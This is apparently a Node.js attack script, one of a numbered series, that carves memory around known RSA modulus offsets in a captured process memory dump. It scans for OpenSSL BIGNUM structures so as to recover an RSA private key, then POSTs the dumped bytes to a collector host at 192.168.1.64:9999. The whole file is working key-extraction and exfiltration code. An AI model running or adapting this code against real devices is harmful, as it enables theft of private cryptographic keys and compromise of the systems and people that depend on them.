"use strict";
// audit103.js - dump memory around modulus fragments found in acr to extract RSA struct.
// Known hits in /tmp/acr_mem2.bin: mid_be at 9534829, 9535413; mid_le at 9530620, 9531084.
// Dump 4KB around each to see the full BIGNUM/RSA layout.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 20000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

// dump 4KB around each known offset
var offsets = [9530620, 9531084, 9534829, 9535002, 9535413, 9535586];
offsets.forEach(function (off) {
    var start = Math.max(0, off - 512);
    out["ctx_" + off] = sh("dd if=/tmp/acr_mem2.bin bs=1 skip=" + start + " count=4096 2>/dev/null | od -A x -t x1z", 12000);
});

// also search for BIGNUM struct patterns near these offsets
// BIGNUM: ptr(4) top(4) dmax(4) neg(4) flags(4) = 20 bytes
// look for plausible top/dmax values (60-80 for RSA-2048 on 32-bit)
out.bignum_scan = sh("od -A x -t x1 /tmp/acr_mem2.bin | awk '/^[0-9a-f]+/ {addr=strtonum(\"0x\"$1); if (addr >= 9528000 && addr <= 9538000) print}' | head -200", 15000);

post("/p103_ctx", out);
post("/p103_done", { started: out.started });
